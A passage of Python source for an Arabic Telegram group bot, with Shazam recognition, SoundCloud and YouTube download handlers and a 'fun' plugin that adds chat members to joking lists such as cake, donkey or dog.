       duration=m.reply_to_message.voice.duration if m.reply_to_message.voice.duration else 301
       fileSize=m.reply_to_message.voice.file_size
     if m.reply_to_message.video:
       duration=m.reply_to_message.video.duration if m.reply_to_message.video.duration else 301
       fileSize=m.reply_to_message.video.file_size
     if duration > 300:
       return await m.reply("🧚‍♀️ مدة المقطع أكثر من 5 دقايق ..")
     if fileSize > 26214400:
       return await m.reply("🧚‍♀️ حجم المقطع أكثر من 25 ميجابايت ..")
     id = random.randint(1,1000)
     msg = await m.reply("جاري المعالجة ...")
     audio = await m.reply_to_message.download(f'./shazam{id}.ogg')
     out = await shazam.recognize_song(f'shazam{id}.ogg')
     os.remove(f'shazam{id}.ogg')
     await msg.delete()
     if not out["matches"]:
       return await m.reply("فشل بالتعرف على الصوت")
     else:
       title = out["track"]["title"]
       author = out["track"]["subtitle"]
       try:
         photo = out["track"]["images"]["background"]
       except:
         photo = "https://telegra.ph/file/49ace69e7c43c0041fb63.jpg"
       k = r.get(f'{Dev_Zaid}:botkey')
       channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'w7G_BoT'
       url = out["track"]["url"]
       TEXT = f"""
{k} اسم الصوت ( [{title}]({url}) )
{k} اسم الفنان : {author}
"""           
       key = InlineKeyboardMarkup ([[InlineKeyboardButton ("🧚‍♀️",url=f"t.me/{channel}")]])
       await m.reply_photo(
         photo,caption=TEXT,reply_markup=key)
       
@Client.on_message(filters.regex("^شازام ") & filters.group)
async def shazamLyrics(c,m):
   if r.get(f'{m.chat.id}:disableShazam:{Dev_Zaid}'):  return False
   query = m.text.split(None,1)[1]
   out = await shazam.search_track(query=query, limit=1)
   if not out:
     return await m.reply("فشل العثور")
   else:
    try:
     key = int(out["tracks"]["hits"][0]["key"])
     title = out["tracks"]["hits"][0]["heading"]["title"][:35]
     author = out["tracks"]["hits"][0]["heading"]["subtitle"]
     url = out["tracks"]["hits"][0]["url"]
     track_id = key
     about_track = await shazam.track_about(track_id=track_id)
     text=about_track["sections"][1]["text"]
     lyrics=""
     for tt in text:
       lyrics+=tt+"\n"
     return await m.reply(lyrics[:4096],reply_markup=InlineKeyboardMarkup (
       [[InlineKeyboardButton (f"{title} - {author}",url=url)]]
     )
     )
    except:
     return await m.reply("فشل العثور")
     
@Client.on_inline_query(filters.regex("SOUND"))
async def SoundCloud(c, query):
  url = query.query.split("#SOUND")[0]
  channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'w7G_BoT'
  if url.count('/') > 1:
    await query.answer(
        results=[           
            InlineQueryResultArticle(
                title="اضغط هنا للتحميل - صوت",
                thumb_url='https://t.me/D7BotResources/161',
                description='~ @YQYQY6 ',
                url='https://t.me/w7G_BoT',
                reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton ("🧚‍♀️", url=f't.me/{channel}')]]),
                input_message_content=InputTextMessageContent(f'https://soundcloud.com{url} #AUDIO',disable_web_page_preview=True)
            ),
            InlineQueryResultArticle(
                title="اضغط هنا للتحميل - بصمة",
                thumb_url='https://t.me/D7BotResources/163',
                description='~ @YQYQY6 ',
                url='https://t.me/w7G_BoT',
                reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton ("🧚‍♀️", url=f't.me/{channel}')]]),
                input_message_content=InputTextMessageContent(f'https://soundcloud.com{url} #VOICE',disable_web_page_preview=True)
            ),
        ],
        cache_time=1
        )
  else:
    await query.answer(
        results=[           
            InlineQueryResultArticle(
                title="اضغط هنا للتحميل - صوت",
                thumb_url='https://t.me/D7BotResources/161',
                description='~ @YQYQY6 ',
                url='https://t.me/w7G_BoT',
                reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton ("🧚‍♀️", url=f't.me/{channel}')]]),
                input_message_content=InputTextMessageContent(f'https://on.soundcloud.com{url} #AUDIO',disable_web_page_preview=True)
            ),
            InlineQueryResultArticle(
                title="اضغط هنا للتحميل - بصمة",
                thumb_url='https://t.me/D7BotResources/163',
                description='~ @YQYQY6 ',
                url='https://t.me/w7G_BoT',
                reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton ("🧚‍♀️", url=f't.me/{channel}')]]),
                input_message_content=InputTextMessageContent(f'https://on.soundcloud.com{url} #VOICE',disable_web_page_preview=True)
            ),
        ],
        cache_time=1
        )


    
@Client.on_callback_query(filters.regex("GET"))
def get_info(c,query):
    Thread(target=getInfo,args=(c,query)).start()

def getInfo(c, query):
    user_id = query.data.split("GET")[0]
    vid_id = query.data.split("GET")[1]
    if not query.from_user.id == int(user_id):
      return
    if not r.get(f'{query.message.id}:one_minute:{user_id}'):
      k = r.get(f'{Dev_Zaid}:botkey')
      query.answer(f'{k} مر على البحث اكثر من دقيقة ابحث مرة ثانية',show_alert=True)
      return query.message.delete()
    if r.get(f'{query.message.chat.id}:disableYT:{Dev_Zaid}'):  return
    if r.get(f':disableYT:{Dev_Zaid}'):  return
    query.message.delete()
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'w7G_BoT'
    yt = YouTube(f'https://youtu.be/{vid_id}')
    #title = yt.title
    """
    photo = requests.get(yt.thumbnail_url).content
    with open(f'{vid_id}.jpg', 'wb') as ww:
       ww.write(photo)
    OriImage = Image.open(f'{vid_id}.jpg')
    blurImage = OriImage.filter(ImageFilter.BoxBlur(10))
    blurImage.save(f'{vid_id}.jpg')
    photo = f'{vid_id}.jpg'
    """
    photo = yt.thumbnail_url
    url = f'https://youtu.be/{vid_id}'
    reply_markup = InlineKeyboardMarkup(
      [
        [
          InlineKeyboardButton ("♫ ملف صوتي", callback_data=f'{user_id}AUDIO{vid_id}'),
          InlineKeyboardButton ("❖ فيديو", callback_data=f'{user_id}VIDEO{vid_id}'),
        ],
        [
          InlineKeyboardButton ('🧚‍♀️', url=f'https://t.me/{channel}')
        ]
      ]
    )
    query.message.reply_to_message.reply_photo(
       photo,
       caption=f'@{channel} ~ {url}',
       reply_markup=reply_markup
    )
    #os.remove(f'{vid_id}.jpg')
    

@Client.on_callback_query(filters.regex("AUDIO"))
async def get_audii(c, query):
    Thread(target=audio_down,args=(c,query)).start()


def audio_down(c, query):
    user_id = query.data.split("AUDIO")[0]
    vid_id = query.data.split("AUDIO")[1]
    if not query.from_user.id == int(user_id):
      return False
    if r.get(f'{query.message.chat.id}:disableYT:{Dev_Zaid}'):  return
    if r.get(f':disableYT:{Dev_Zaid}'):  return
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'w7G_BoT'
    rep = InlineKeyboardMarkup (
     [[
       InlineKeyboardButton ('🧚‍♀️', url=f'https://t.me/{channel}')
     ]]
    )
    if ytdb.get(f'ytvideo{vid_id}'):
       aud = ytdb.get(f'ytvideo{vid_id}')
       query.edit_message_caption(f"@{channel} :)", reply_markup=rep)
       duration= aud["duration"]
       sec = time.strftime('%M:%S', time.gmtime(duration))
       return query.message.reply_audio(aud["audio"],caption=f'@{channel} ~ ⏳ {sec}')       
    url = f'https://youtu.be/{vid_id}'
    query.edit_message_caption("جاري التحميل ..", reply_markup=rep)    
    #ydl_ops = {"format": "bestaudio[ext=m4a]"}
    ydl_ops = {"format": "bestaudio[ext=m4a]",'forceduration':True, "username": "oauth2", "password": ''}
    with yt_dlp.YoutubeDL(ydl_ops) as ydl:
        info = ydl.extract_info(url, download=False)
        if int(info['duration']) > 1555555555555:
          return query.edit_message_caption("صوت اكثر من 25 دقيقة مقدر انزله",reply_markup=rep)
        audio_file = ydl.prepare_filename(info)
        ydl.process_info(info)
    query.edit_message_caption("✈️✈️✈️✈️✈️", reply_markup=rep)
    duration= int(info['duration'])
    sec = time.strftime('%M:%S', time.gmtime(duration))
    os.rename(audio_file,audio_file.replace(".m4a",".mp3"))
    audio_file = audio_file.replace(".m4a",".mp3")
    a = query.message.reply_audio(
      audio_file,
      title=info['title'],
      duration=int(info['duration']),
      performer=info['channel'],
      caption=f'@{channel} ~ ⏳ {sec}',
    )
    query.edit_message_caption(f"@{channel} :)", reply_markup=rep)    
    ytdb.set(f'ytvideo{vid_id}',{"type":"audio","audio":a.audio.file_id,"duration":a.audio.duration})
    os.remove(audio_file)


"""
@Client.on_callback_query(filters.regex("AUDIO"))
def get_audii(c, query):
    Thread(target=audio_down,args=(c,query)).start()
    
def audio_down(c, query):
    user_id = query.data.split("AUDIO")[0]
    vid_id = query.data.split("AUDIO")[1]
    if not query.from_user.id == int(user_id):
      return
    if r.get(f'{query.message.chat.id}:disableYT:{Dev_Zaid}'):  return
    if r.get(f':disableYT:{Dev_Zaid}'):  return
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'w7G_BoT'
    rep = InlineKeyboardMarkup (
     [[
       InlineKeyboardButton ('🧚‍♀️', url=f'https://t.me/{channel}')
     ]]
    )
    url = f'https://youtu.be/{vid_id}'
    if r.get(f'ytvideo{vid_id}'):
       aud = r.get(f'ytvideo{vid_id}')
       query.edit_message_caption(f"@{channel} :)", reply_markup=rep)
       yt = YouTube(url)
       duration= int(yt.length)
       sec = time.strftime('%M:%S', time.gmtime(duration))
       return query.message.reply_audio(aud,caption=f'@{channel} ~ ⏳ {sec}')
    query.edit_message_caption("جاري التحميل ..", reply_markup=rep)
    yt = YouTube(url)
    duration= int(yt.length)
    sec = time.strftime('%M:%S', time.gmtime(duration))  
    if duration > 1505:
      return query.edit_message_caption("صوت اكثر من 25 دقيقة مقدر انزله",reply_markup=rep)
    yt.streams.get_audio_only().download(filename=f'{vid_id}.mp3')
    query.edit_message_caption("✈️✈️✈️✈️✈️", reply_markup=rep)
    a = query.message.reply_audio(
      f'{vid_id}.mp3',
      title=yt.title,
      duration=yt.length,
      performer=yt.author,
      caption=f'@{channel} ~ ⏳ {sec}',
    )
    query.edit_message_caption(f"@{channel} :)", reply_markup=rep)
    
    r.set(f'ytvideo{vid_id}',b.link)
    os.remove(f'{vid_id}.mp3')
"""

@Client.on_callback_query(filters.regex("VIDEO"))
def get_video(c, query):
   Thread(target=video_down,args=(c,query)).start()

def video_down(c, query):
    user_id = query.data.split("VIDEO")[0]
    vid_id = query.data.split("VIDEO")[1]
    if not query.from_user.id == int(user_id):
      return False
    if r.get(f'{query.message.chat.id}:disableYT:{Dev_Zaid}'):  return
    if r.get(f':disableYT:{Dev_Zaid}'):  return
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'w7G_BoT'
    rep = InlineKeyboardMarkup (
     [[
       InlineKeyboardButton ('🧚‍♀️', url=f'https://t.me/{channel}')
     ]]
    )
    if ytdb.get(f'ytvideoV{vid_id}'):
       vid = ytdb.get(f'ytvideoV{vid_id}')
       query.edit_message_caption(f"@{channel} :)", reply_markup=rep)
       duration=vid["duration"]
       sec = time.strftime('%M:%S', time.gmtime(duration))
       return query.message.reply_video(vid["video"],caption=f'@{channel} ~ ⏳ {sec}')
    url = f'https://youtu.be/{vid_id}'
    query.edit_message_caption("جاري التحميل ..", reply_markup=rep)
    with yt_dlp.YoutubeDL({}) as ydl:
        info = ydl.extract_info(url, download=False)
        if int(info['duration']) > 1555555555:
          return query.edit_message_caption("فيديو اكثر من 25 دقيقة مقدر انزله",reply_markup=rep)
    ydl_opts = {
        "format": "best",
        "keepvideo": True,
        "prefer_ffmpeg": False,
        "geo_bypass": True,
        "outtmpl": "%(title)s.%(ext)s",
        "quite": True,
        "username": "oauth2", 
        "password": ''
    }
    with YoutubeDL(ydl_opts) as ytdl:
        ytdl_data = ytdl.extract_info(url, download=True)
        file_name = ytdl.prepare_filename(ytdl_data)
    query.edit_message_caption("✈️✈️✈️✈️✈️", reply_markup=rep)
    duration= int(info['duration'])
    sec = time.strftime('%M:%S', time.gmtime(duration))
    a = query.message.reply_video(
      file_name,
      duration=int(info['duration']),
      caption=f'@{channel} ~ ⏳ {sec}',
    )
    query.edit_message_caption(f"@{channel} :)", reply_markup=rep)    
    ytdb.set(f'ytvideoV{vid_id}',{"type":"video","video":a.video.file_id,"duration":a.video.duration})
    os.remove(file_name)

"""
@Client.on_callback_query(filters.regex("VIDEO"))
async def get_video(c, query):
    Thread(target=video_down,args=(c,query)).start()
    
def video_down(c, query):
    user_id = query.data.split("VIDEO")[0]
    vid_id = query.data.split("VIDEO")[1]
    if not query.from_user.id == int(user_id):
      return
    if r.get(f'{query.message.chat.id}:disableYT:{Dev_Zaid}'):  return
    if r.get(f':disableYT:{Dev_Zaid}'):  return
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'w7G_BoT'
    rep = InlineKeyboardMarkup (
     [[
       InlineKeyboardButton ('🧚‍♀️', url=f'https://t.me/{channel}')
     ]]
    )
    url = f'https://youtu.be/{vid_id}'    
    if r.get(f'ytvideoV{vid_id}'):
       vid = r.get(f'ytvideoV{vid_id}')       
       query.edit_message_caption(f"@{channel} :)", reply_markup=rep)
       yt = YouTube(url)
       duration= int(yt.length)
       sec = time.strftime('%M:%S', time.gmtime(duration))
       return query.message.reply_video(vid,caption=f'@{channel} ~ ⏳ {sec}')
    query.edit_message_caption("جاري التحميل ..", reply_markup=rep)
    yt = YouTube(url)
    duration= int(yt.length)
    sec = time.strftime('%M:%S', time.gmtime(duration))
    if duration > 1505:
      return query.edit_message_caption("صوت اكثر من 25 دقيقة مقدر انزله",reply_markup=rep)
    yt.streams.get_highest_resolution().download(filename=f'{vid_id}.mp4')
    query.edit_message_caption("✈️✈️✈️✈️✈️", reply_markup=rep)       
    a = query.message.reply_video(
      f'{vid_id}.mp4',
      duration=duration,
      caption=f'@{channel} ~ ⏳ {sec}',
    )
    query.edit_message_caption(f"@{channel} :)", reply_markup=rep)
    
    r.set(f'ytvideoV{vid_id}',b.link)    
    os.remove(f'{vid_id}.mp4')
"""
# ==================== FILE: fun.py ====================
'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''



@Client.on_message(filters.text & filters.group, group=34)
def funHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'yqyqy66'
    Thread(target=funFunc,args=(c,m,k,channel)).start()
    
def funFunc(c,m,k,channel):
   if r.get(f'{m.chat.id}:disableFun:{Dev_Zaid}'):  return 
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return  
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   if isLockCommand(m.from_user.id, m.chat.id, text): return
   ################# CAKE #################
   if text == 'رفع كيك' or text == 'رفع كيكه' or text == 'رفع كيكة':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:CakeList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} كيكه من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:CakeList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:CakeName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته كيكه 🍰\n☆')
   
   if text == 'تنزيل كيك' or text == 'تنزيل كيكه' or text == 'تنزيل كيكة':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:CakeList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو كيكه من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:CakeList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:CakeName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من كيكه\n☆')
   
   if text == 'قائمه الكيك' or text == 'قائمة الكيك':
     if not r.smembers(f'{Dev_Zaid}:CakeList:{m.chat.id}'):
       return m.reply(f'{k} قائمة الكيك فاضية')
     else:
       txt = '- قائمة الكيك 🍰\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:CakeList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:CakeName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة الكيك' or text == 'مسح قائمه الكيك':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:CakeList:{m.chat.id}'):
         return m.reply(f'{k} قائمة الكيك فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة الكيك')
         for cake in r.smembers(f'{Dev_Zaid}:CakeList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:CakeList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:CakeName:{cake}')
           
   ################# CAKE #################
   
   ################# 3SL #################
   if text == 'رفع عسل':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:3SLList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} عسل من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:3SLList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:3SLName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته عسل 🍯\n☆')
   
   if text == 'تنزيل عسل':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:3SLList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو عسل من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:3SLList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:3SLName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من عسل\n☆')
   
   if text == 'قائمه العسل' or text == 'قائمة العسل':
     if not r.smembers(f'{Dev_Zaid}:3SLList:{m.chat.id}'):
       return m.reply(f'{k} قائمة العسل فاضية')
     else:
       txt = '- قائمة العسل 🍯\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:3SLList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:3SLName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة العسل' or text == 'مسح قائمه العسل':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:3SLList:{m.chat.id}'):
         return m.reply(f'{k} قائمة العسل فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة العسل')
         for cake in r.smembers(f'{Dev_Zaid}:3SLList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:3SLList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:3SLName:{cake}')

   ################# 3SL #################
   
   ################# ZQ #################
   if text == 'رفع نصاب':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:ZQList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} نصاب من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:ZQList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:ZQName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته نصاب 💩\n☆')
   
   if text == 'تنزيل نصاب':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:ZQList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو نصاب من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:ZQList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:ZQName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من نصاب\n☆')
   
   if text == 'قائمه النصابين' or text == 'قائمة النصابين':
     if not r.smembers(f'{Dev_Zaid}:ZQList:{m.chat.id}'):
       return m.reply(f'{k} قائمة النصابين فاضية')
     else:
       txt = '- قائمة النصابين 💩\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:ZQList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:ZQName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة النصابين' or text == 'مسح قائمه النصابين':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:ZQList:{m.chat.id}'):
         return m.reply(f'{k} قائمة النصابين فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة النصابين')
         for cake in r.smembers(f'{Dev_Zaid}:ZQList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:ZQList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:ZQName:{cake}')

   ################# ZQ #################
   
   ################# 7MR #################
   if text == 'رفع حمار':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:7MRList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} حمار من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:7MRList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:7MRName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته حمار 🦓\n☆')
   
   if text == 'تنزيل حمار':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:7MRList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو حمار من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:7MRList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:7MRName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من حمار\n☆')
   
   if text == 'قائمه الحمير' or text == 'قائمة الحمير':
     if not r.smembers(f'{Dev_Zaid}:7MRList:{m.chat.id}'):
       return m.reply(f'{k} قائمة الحمير فاضية')
     else:
       txt = '- قائمة الحمير 🦓\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:7MRList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:7MRName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة الحمير' or text == 'مسح قائمه الحمير':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:7MRList:{m.chat.id}'):
         return m.reply(f'{k} قائمة الحمير فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة الحمير')
         for cake in r.smembers(f'{Dev_Zaid}:7MRList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:7MRList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:7MRName:{cake}')

   ################# 7MR #################
   
   ################# COW #################
   if text == 'رفع بقرة' or text == 'رفع بقره':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:COWList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} بقرة من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:COWList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:COWName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته بقرة 🐄\n☆')
   
   if text == 'تنزيل بقرة' or text == 'تنزيل بقره':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:COWList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو بقرة من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:COWList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:COWName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من بقرة\n☆')
   
   if text == 'قائمه البقر' or text == 'قائمة البقر':
     if not r.smembers(f'{Dev_Zaid}:COWList:{m.chat.id}'):
       return m.reply(f'{k} قائمة البقر فاضية')
     else:
       txt = '- قائمة البقر 🐄\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:COWList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:COWName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
       return m.reply(txt, disable_web_page_preview=True)
   
   if text == 'مسح قائمة البقر' or text == 'مسح قائمه البقر':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.smembers(f'{Dev_Zaid}:COWList:{m.chat.id}'):
         return m.reply(f'{k} قائمة البقر فاضية')
       else:
         m.reply(f'{k} ابشر مسحت قائمة البقر')
         for cake in r.smembers(f'{Dev_Zaid}:COWList:{m.chat.id}'):
           r.srem(f'{Dev_Zaid}:COWList:{m.chat.id}',int(cake))
           r.delete(f'{Dev_Zaid}:COWName:{cake}')

   ################# COW #################
   
   ################# DOG #################
   if text == 'رفع كلب':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if r.sismember(f'{Dev_Zaid}:DOGList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} كلب من قبل\n☆')
       else:
         r.sadd(f'{Dev_Zaid}:DOGList:{m.chat.id}',id)
         r.set(f'{Dev_Zaid}:DOGName:{id}', mention)
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر رفعته كلب 🐩\n☆')
   
   if text == 'تنزيل كلب':
     if m.reply_to_message and m.reply_to_message.from_user:
       mention = m.reply_to_message.from_user.mention
       id = m.reply_to_message.from_user.id
       if not r.sismember(f'{Dev_Zaid}:DOGList:{m.chat.id}',id):
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} مو كلب من قبل\n☆')
       else:
         r.srem(f'{Dev_Zaid}:DOGList:{m.chat.id}',id)
         r.delete(f'{Dev_Zaid}:DOGName:{id}')
         return m.reply(f'「 ⁪⁬⁪⁬{mention} 」\n{k} ابشر نزلته من كلب\n☆')
   
   if text == 'قائمه الكلاب' or text == 'قائمة الكلاب':
     if not r.smembers(f'{Dev_Zaid}:DOGList:{m.chat.id}'):
       return m.reply(f'{k} قائمة الكلاب فاضية')
     else:
       txt = '- قائمة الكلاب 🐩\n'
       count = 1
       for cake in r.smembers(f'{Dev_Zaid}:DOGList:{m.chat.id}'):
          mention = r.get(f'{Dev_Zaid}:DOGName:{cake}')
          txt += f'{count} ➣ ⁪⁬⁪⁬{mention} ࿓ ( `{cake}` )\n'
          count += 1
       txt += '\n☆'
